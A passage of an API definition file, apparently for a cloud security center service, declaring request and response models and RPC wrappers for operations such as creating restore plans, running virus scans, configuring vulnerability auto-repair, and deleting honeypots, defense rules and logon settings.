  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2FAEB7D0-C0B9-581C-877A-F80F50AA****'),
}

model CreateUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateUniBackupPolicyResponseBody(name='body'),
}

async function createUniBackupPolicy(request: CreateUniBackupPolicyRequest): CreateUniBackupPolicyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateUniBackupPolicy', 'POST', '/', 'json', false, 'json', request);
}

model CreateUniRestorePlanRequest {
  database?: string(name='Database', description='The name of the database.', example='qtc', position='Query'),
  instanceUuid?: string(name='InstanceUuid', description='The UUID of the Hybrid Backup Recovery (HBR) agent that is used to restore the data of the database on your server.

>  You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the UUID.', example='ac457b30598d11ed800000163e02****', position='Query'),
  policyId: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the ID.', example='123', position='Query'),
  resetScn?: string(name='ResetScn', description='The identifier of the point in time for restoration in the backup version that you want to use. The database is an Oracle database.****

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the value.', example='925702.0', position='Query'),
  resetTime?: string(name='ResetTime', description='The point in time for restoration in the backup version that you want to use. The database is an Oracle database.****

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the value.', example='2022-10-29 01:06:24', position='Query'),
  restoreInfo?: string(name='RestoreInfo', description='The information about the database. This parameter is available when the database is a Microsoft SQL Server (MSSQL) database. The value is a JSON string. Valid values:

*   **name**: the name of the database
*   **files**: the path to the database files

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the information.', example='{"files": {"qtc":"F:\\\\database\\\\qtc.mdf","qtc_log":"F:\\\\database\\\\qtc_0.ldf"},
"name":"qtc"}', position='Query'),
  timePoint: long(name='TimePoint', description='The point in time to which you want to restore data.

>  You can call the [DescribeRestorePlans](~~DescribeRestorePlans~~) operation to query the point in time.', example='1656957664000', position='Query'),
}

model CreateUniRestorePlanResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model CreateUniRestorePlanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateUniRestorePlanResponseBody(name='body'),
}

async function createUniRestorePlan(request: CreateUniRestorePlanRequest): CreateUniRestorePlanResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateUniRestorePlan', 'POST', '/', 'json', false, 'json', request);
}

model CreateVirusScanOnceTaskRequest {
  scanPath?: [ string ](name='ScanPath', description='The information about the scan path that is required for a custom scan.', position='Query'),
  scanType?: string(name='ScanType', description='The type of the virus scan. Valid values:

*   **system**: system scan.
*   **user**: custom scan.', example='system', position='Query'),
  selectionKey?: string(name='SelectionKey', description='The key that stores the asset information.

> You can call the [GetAssetSelectionConfig](~~GetAssetSelectionConfig~~) operation to obtain the key value.', example='845de1ec-4b08-42e1-b564-31321e48xxxx', position='Query'),
}

model CreateVirusScanOnceTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model CreateVirusScanOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateVirusScanOnceTaskResponseBody(name='body'),
}

async function createVirusScanOnceTask(request: CreateVirusScanOnceTaskRequest): CreateVirusScanOnceTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateVirusScanOnceTask', 'POST', '/', 'json', false, 'json', request);
}

model CreateVulAutoRepairConfigRequest {
  reason?: string(name='Reason', description='The reason why the vulnerability can be automatically fixed.', example='TestAutoRepair', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Valid values: -**cve**: Linux software vulnerability -**sys**: Windows system vulnerability', example='cve', position='Query'),
  vulAutoRepairConfigList: [ 
    {
      aliasName: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25032:zlib 1.2.11 memory corruption'),
      name: string(name='Name', description='The name of the vulnerability.', example='anolisos:8.4:ANSA-2022:0001'),
    }
  ](name='VulAutoRepairConfigList', description='The vulnerabilities that can be automatically fixed.', position='Query'),
}

model CreateVulAutoRepairConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateVulAutoRepairConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateVulAutoRepairConfigResponseBody(name='body'),
}

async function createVulAutoRepairConfig(request: CreateVulAutoRepairConfigRequest): CreateVulAutoRepairConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'CreateVulAutoRepairConfig', 'POST', '/', 'json', false, 'json', request);
}

model DeleteAntiBruteForceRuleRequest {
  ids: [ long ](name='Ids', description='The IDs of the defense rules against brute-force attacks to delete.', position='Query'),
}

model DeleteAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
}

model DeleteAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteAntiBruteForceRuleResponseBody(name='body'),
}

async function deleteAntiBruteForceRule(request: DeleteAntiBruteForceRuleRequest): DeleteAntiBruteForceRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteAntiBruteForceRule', 'POST', '/', 'json', false, 'json', request);
}

model DeleteBackupPolicyRequest {
  id: long(name='Id', description='The ID of the anti-ransomware policy that you want to delete.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='12', position='Query'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy that you want to delete. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0', position='Query'),
}

model DeleteBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DeleteBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBackupPolicyResponseBody(name='body'),
}

async function deleteBackupPolicy(request: DeleteBackupPolicyRequest): DeleteBackupPolicyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteBackupPolicy', 'POST', '/', 'json', false, 'json', request);
}

model DeleteBackupPolicyMachineRequest {
  policyId: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='11', position='Query'),
  policyVersion: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies.', example='2.0.0', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server to which the anti-ransomware policy is applied.

> You must specify at least one of the `UuidList` and `Uuid` parameters.', example='083036e9-8411-4a9d-83af-9acbd****', position='Query'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.

> You must specify at least one of the `UuidList` and `Uuid` parameters.', position='Query'),
}

model DeleteBackupPolicyMachineResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model DeleteBackupPolicyMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBackupPolicyMachineResponseBody(name='body'),
}

async function deleteBackupPolicyMachine(request: DeleteBackupPolicyMachineRequest): DeleteBackupPolicyMachineResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteBackupPolicyMachine', 'POST', '/', 'json', false, 'json', request);
}

model DeleteBinarySecurityPolicyRequest {
  name?: string(name='Name', description='The name of the binary security policy.', example='policy-auto-bfu7pm', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.120.XXX.XXX', position='Query'),
}

model DeleteBinarySecurityPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A6CFADC0-1167-521A-9284-8CD8034C****'),
}

model DeleteBinarySecurityPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBinarySecurityPolicyResponseBody(name='body'),
}

async function deleteBinarySecurityPolicy(request: DeleteBinarySecurityPolicyRequest): DeleteBinarySecurityPolicyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteBinarySecurityPolicy', 'POST', '/', 'json', false, 'json', request);
}

model DeleteClientUserDefineRuleRequest {
  idList: [ long ](name='IdList', description='The IDs of the custom defense rules.', position='Query'),
}

model DeleteClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4552b59b-18f2-4fad-b6a2-0d59b8f2****'),
}

model DeleteClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteClientUserDefineRuleResponseBody(name='body'),
}

async function deleteClientUserDefineRule(request: DeleteClientUserDefineRuleRequest): DeleteClientUserDefineRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteClientUserDefineRule', 'POST', '/', 'json', false, 'json', request);
}

model DeleteContainerDefenseRuleRequest {
  ruleIds?: [ long ](name='RuleIds', position='Query'),
}

model DeleteContainerDefenseRuleResponseBody = {
  code?: string(name='Code', example='200'),
  data?: long(name='Data', example='1'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='47365EC5-**-6DEA1788EB11'),
  success?: boolean(name='Success', example='true'),
}

model DeleteContainerDefenseRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteContainerDefenseRuleResponseBody(name='body'),
}

async function deleteContainerDefenseRule(request: DeleteContainerDefenseRuleRequest): DeleteContainerDefenseRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteContainerDefenseRule', 'POST', '/', 'json', false, 'json', request);
}

model DeleteContainerPluginRuleRequest {
  lang?: string(name='Lang', description='The language of the content within the request and the response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  ruleId: int32(name='RuleId', description='The ID of the rule.', example='200022', position='Query'),
}

model DeleteContainerPluginRuleResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the container plug-in is manually deleted. Valid values: **true** and **false**.', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DeleteContainerPluginRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteContainerPluginRuleResponseBody(name='body'),
}

async function deleteContainerPluginRule(request: DeleteContainerPluginRuleRequest): DeleteContainerPluginRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteContainerPluginRule', 'POST', '/', 'json', false, 'json', request);
}

model DeleteCustomBlockRecordRequest {
  id: long(name='Id', description='The ID of the IP address blocking policy.

> You can call the [DescribeCustomBlockRecords](~~DescribeCustomBlockRecords~~) operation to query the ID.', example='381**', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
}

model DeleteCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DeleteCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteCustomBlockRecordResponseBody(name='body'),
}

async function deleteCustomBlockRecord(request: DeleteCustomBlockRecordRequest): DeleteCustomBlockRecordResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteCustomBlockRecord', 'POST', '/', 'json', false, 'json', request);
}

model DeleteCycleTaskRequest {
  configId: string(name='ConfigId', description='The ID of the task configuration.

>  You can call the [DescribeCycleTaskList](~~DescribeCycleTaskList~~) operation to query the IDs of task configurations.', example='435f626256ebf564cf5ba966a539****', position='Query'),
}

model DeleteCycleTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7DBB3D54-AF29-5BF4-8B44-9CFA94F50****'),
}

model DeleteCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteCycleTaskResponseBody(name='body'),
}

async function deleteCycleTask(request: DeleteCycleTaskRequest): DeleteCycleTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteCycleTask', 'POST', '/', 'json', false, 'json', request);
}

model DeleteFileProtectRuleRequest {
  id?: [ long ](name='Id', description='The IDs of the core file monitoring rules that you want to delete.', position='Query'),
}

model DeleteFileProtectRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7FD1C1DC-AA67-510A-A022-5D23310C3658'),
}

model DeleteFileProtectRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteFileProtectRuleResponseBody(name='body'),
}

async function deleteFileProtectRule(request: DeleteFileProtectRuleRequest): DeleteFileProtectRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteFileProtectRule', 'POST', '/', 'json', false, 'json', request);
}

model DeleteGroupRequest {
  groupId: long(name='GroupId', description='The ID of the server group that you want to delete.

>  To delete a server group, you must provide the ID of the server group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the ID.', example='9454789', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.172.XX.XX', position='Query'),
}

model DeleteGroupResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteGroupResponseBody(name='body'),
}

/**
  * The **Default** server group that is provided by Security Center cannot be deleted. After you delete a group, the assets in this group are moved to the **Default** group.
  *
 */
async function deleteGroup(request: DeleteGroupRequest): DeleteGroupResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteGroup', 'POST', '/', 'json', false, 'json', request);
}

model DeleteHoneypotRequest {
  honeypotId: string(name='HoneypotId', description='The ID of the honeypot.

> You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='558b5fa40948ebe2171a74757c54dc7e58f761870fa7ee6a105e70947ec82aa9', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DeleteHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E14721CB-B32F-56F2-8490-CDA18E4F9268'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotResponseBody(name='body'),
}

async function deleteHoneypot(request: DeleteHoneypotRequest): DeleteHoneypotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteHoneypot', 'POST', '/', 'json', false, 'json', request);
}

model DeleteHoneypotNodeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  nodeId: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='670baeee-86c4-46b9-8200-a2c38141a453', position='Query'),
}

model DeleteHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='49FDE92F-A0B8-56CC-B7A8-23B17646CCAD'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotNodeResponseBody(name='body'),
}

async function deleteHoneypotNode(request: DeleteHoneypotNodeRequest): DeleteHoneypotNodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteHoneypotNode', 'POST', '/', 'json', false, 'json', request);
}

model DeleteHoneypotPresetRequest {
  honeypotPresetId: string(name='HoneypotPresetId', description='The ID of the honeypot template.

> You can call the [ListHoneypotPreset](~~ListHoneypotPreset~~) operation to query the IDs of honeypot templates.', example='84104b7b-a2bc-41df-a190-12298f99xxxx', position='Query'),
  lang?: string(name='Lang', description='设置请求和接收消息的语言类型，默认为**zh**。取值：
- **zh**：中文
- **en**：英文', example='zh', position='Query'),
}

model DeleteHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotPresetResponseBody(name='body'),
}

async function deleteHoneypotPreset(request: DeleteHoneypotPresetRequest): DeleteHoneypotPresetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteHoneypotPreset', 'POST', '/', 'json', false, 'json', request);
}

model DeleteHoneypotProbeRequest {
  lang?: string(name='Lang', description='设置请求和接收消息的语言类型，默认为**zh**。取值：

- **zh**：中文
- **en**：英文', example='zh', position='Query'),
  probeId: string(name='ProbeId', description='The ID of the probe.

> You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='95f0f79c-f7e9-4b09-a6e3-95a4cb6d****', position='Query'),
}

model DeleteHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7FD1C1DC-AA67-510A-A022-5D23310C3658'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotProbeResponseBody(name='body'),
}

async function deleteHoneypotProbe(request: DeleteHoneypotProbeRequest): DeleteHoneypotProbeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteHoneypotProbe', 'POST', '/', 'json', false, 'json', request);
}

model DeleteHoneypotProbeBindRequest {
  bindId?: string(name='BindId', description='The unique ID of the bound service.', example='aa20815f-f0f3-4e3b-8e13-55771742****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  probeId?: string(name='ProbeId', description='The probe ID.

>  You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='aa234650-cfcf-4e25-b61f-c58f603f****', position='Query'),
}

model DeleteHoneypotProbeBindResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteHoneypotProbeBindResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotProbeBindResponseBody(name='body'),
}

async function deleteHoneypotProbeBind(request: DeleteHoneypotProbeBindRequest): DeleteHoneypotProbeBindResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteHoneypotProbeBind', 'POST', '/', 'json', false, 'json', request);
}

model DeleteImageEventOperationRequest {
  id?: long(name='Id', example='1404656', position='Query'),
}

model DeleteImageEventOperationResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    id?: long(name='Id', example='443496'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
  success?: boolean(name='Success', example='true'),
}

model DeleteImageEventOperationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteImageEventOperationResponseBody(name='body'),
}

async function deleteImageEventOperation(request: DeleteImageEventOperationRequest): DeleteImageEventOperationResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteImageEventOperation', 'POST', '/', 'json', false, 'json', request);
}

model DeleteImageVulWhitelistRequest {
  ids?: string(name='Ids', description='The ID of the whitelist. Separate multiple IDs with commas (,).', example='123', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DeleteImageVulWhitelistResponseBody = {
  code?: string(name='Code', description='The response code.', example='200'),
  data?: boolean(name='Data', description='Indicates whether the image vulnerability whitelist is deleted. Valid values:

*   **true**
*   **false**', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteImageVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteImageVulWhitelistResponseBody(name='body'),
}

async function deleteImageVulWhitelist(request: DeleteImageVulWhitelistRequest): DeleteImageVulWhitelistResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteImageVulWhitelist', 'POST', '/', 'json', false, 'json', request);
}

model DeleteInstallCodeRequest {
  captchaCode: string(name='CaptchaCode', description='The installation command.

>  You can call the [DescribeInstallCodes](~~DescribeInstallCodes~~) operation to query installation commands.', example='1q****', position='Query'),
}

model DeleteInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model DeleteInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInstallCodeResponseBody(name='body'),
}

async function deleteInstallCode(request: DeleteInstallCodeRequest): DeleteInstallCodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteInstallCode', 'POST', '/', 'json', false, 'json', request);
}

model DeleteInterceptionRuleRequest {
  clusterId: string(name='ClusterId', description='The ID of the cluster that you want to query.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='cdf629147cc3747d292a3f587xxxxxxxx', position='Query'),
  ruleIds?: [ long ](name='RuleIds', description='The IDs of the rules that you want to delete.', position='Query'),
}

model DeleteInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXXX'),
}

model DeleteInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInterceptionRuleResponseBody(name='body'),
}

async function deleteInterceptionRule(request: DeleteInterceptionRuleRequest): DeleteInterceptionRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteInterceptionRule', 'POST', '/', 'json', false, 'json', request);
}

model DeleteInterceptionTargetRequest {
  targetIds: string(name='TargetIds', description='The IDs of the network objects that you want to remove. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the IDs of the network objects.', example='1,11,111', position='Query'),
}

model DeleteInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D81DD78E-E006-5C65-A171-C8CB09XXXXX'),
  result?: boolean(name='Result', description='Indicates whether the network objects are removed. Valid values:

*   **true**: The network objects are removed.
*   **false**: The network objects fail to be removed.', example='true'),
}

model DeleteInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInterceptionTargetResponseBody(name='body'),
}

async function deleteInterceptionTarget(request: DeleteInterceptionTargetRequest): DeleteInterceptionTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteInterceptionTarget', 'POST', '/', 'json', false, 'json', request);
}

model DeleteK8sAccessInfoRequest {
  aliyunYundunGatewayApiName?: string(name='AliyunYundunGatewayApiName', example='None', position='Query'),
  aliyunYundunGatewayPopName?: string(name='AliyunYundunGatewayPopName', example='None', position='Query'),
  aliyunYundunGatewayProjectName?: string(name='AliyunYundunGatewayProjectName', example='None', position='Query'),
  id: long(name='Id', example='200', position='Query'),
}

model DeleteK8sAccessInfoResponseBody = {
  data?: boolean(name='Data', example='true'),
  requestId?: string(name='RequestId', example='C5338DE5-5D80-51A1-B330-98300AFB80E9'),
}

model DeleteK8sAccessInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteK8sAccessInfoResponseBody(name='body'),
}

async function deleteK8sAccessInfo(request: DeleteK8sAccessInfoRequest): DeleteK8sAccessInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteK8sAccessInfo', 'POST', '/', 'json', false, 'json', request);
}

model DeleteLoginBaseConfigRequest {
  config: string(name='Config', description='The content of the logon security settings to delete. The content varies based on the type of the logon security settings. Valid values:

*   **login\\_common_ip**: approved logon IP addresses

Example: {"ip":"10.23.23.23"}.

*   **login\\_common_time**: approved logon time ranges

Example: {"startTime":"06:00:00","endTime":"16:00:00"}.

*   **login\\_common_account**: approved logon accounts

Example: {"account":"test_account\\_001"}.

*   **login\\_common_location**: approved logon locations

Example: {"location":"Shanghai"}.', example='{"startTime":"06:00:00","endTime":"16:00:00"}', position='Query'),
  target?: string(name='Target', description='The UUID of the server whose logon security settings you want to delete.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****', position='Query'),
  type: string(name='Type', description='The type of the logon security settings to delete. Valid values:

*   **login\\_common_ip**: approved logon IP addresses
*   **login\\_common_time**: approved logon time ranges
*   **login\\_common_account**: approved logon accounts
*   **login\\_common_location**: approved logon locations', example='login_common_time', position='Query'),
}

model DeleteLoginBaseConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteLoginBaseConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteLoginBaseConfigResponseBody(name='body'),
}

async function deleteLoginBaseConfig(request: DeleteLoginBaseConfigRequest): DeleteLoginBaseConfigResponse {
